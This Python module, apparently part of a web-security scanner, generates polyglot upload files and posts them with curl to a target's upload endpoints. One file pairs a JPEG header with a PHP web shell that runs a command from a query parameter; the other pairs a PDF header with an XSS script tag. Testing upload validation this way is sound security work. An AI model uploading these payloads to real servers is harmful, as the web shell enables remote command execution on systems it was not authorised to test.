"""
modules/upload/polyglot_runner.py  — gated: has_file_upload

Genera e carica file polimorfici (PDF+PHP, ZIP+HTML, JPEG+JS)
che passano la validazione magic-byte ma contengono payload attivi.

Dipendenza esterna minima: solo curl per l'upload.
I file polimorfici sono generati in-process con header hardcoded.

Output: reports/<service>/polyglot.json
"""

import os
import tempfile

from modules.base_runner import BaseRunner, make_run_fn

_TARGET_URL = "http://localhost"

# (filename, bytes_prefix, payload_suffix, description)
_POLYGLOTS = [
    (
        "img.php.jpg",
        bytes([0xFF, 0xD8, 0xFF, 0xE0]),  # JPEG magic
        b"\n<?php system($_GET['c']); ?>",
        "JPEG magic + PHP tail",
    ),
    (
        "doc.html.pdf",
        b"%PDF-1.4\n",
        b"\n<script>alert(document.domain)</script>",
        "PDF magic + HTML/XSS tail",
    ),
]


class PolyglotRunner(BaseRunner):
    MODULE_NAME = "polyglot"

    def execute(self):
        if not self.stack.get("has_file_upload"):
            return "skipped", "skip: has_file_upload=False"

        target_base = self.settings.get("target_url", _TARGET_URL).rstrip("/")
        upload_locs = {loc["file"] for loc in self.stack.get("file_upload_locations", [])}
        upload_eps = [ep for ep in self.endpoints if ep["file"] in upload_locs]
        if not upload_eps:
            return "skipped", "skip: no endpoints mapped to upload sinks"

        for ep in upload_eps:
            url = f"{target_base}{ep['path']}"
            param = next((p["name"] for p in ep.get("params", []) if p.get("type") == "file"), "file")
            for fname, prefix, suffix, desc in _POLYGLOTS:
                self._upload(url, ep, param, fname, prefix + suffix, desc)

        return "completed", None

    def _upload(self, url: str, ep: dict, param: str, fname: str, content: bytes, desc: str):
        with tempfile.NamedTemporaryFile(suffix=os.path.splitext(fname)[1], delete=False) as tmp:
            tmp.write(content)
            tmp_path = tmp.name
        try:
            rc, stdout, _ = self.sh(
                ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                 "-F", f"{param}=@{tmp_path};filename={fname}",
                 url, "--max-time", str(self.timeout)],
            )
            if rc == 0 and stdout.strip() in ("200", "201", "302"):
                self.add_finding(
                    type_="file_upload",
                    file_=ep["file"],
                    line=ep["line"],
                    endpoint=ep["path"],
                    method=ep["method"],
                    confidence="low",
                    detail=f"polyglot: HTTP {stdout.strip()} for {fname!r} ({desc}); verify if payload executes",
                    payload=fname,
                    requires_manual_review=True,
                )
        finally:
            os.unlink(tmp_path)


run = make_run_fn(PolyglotRunner)
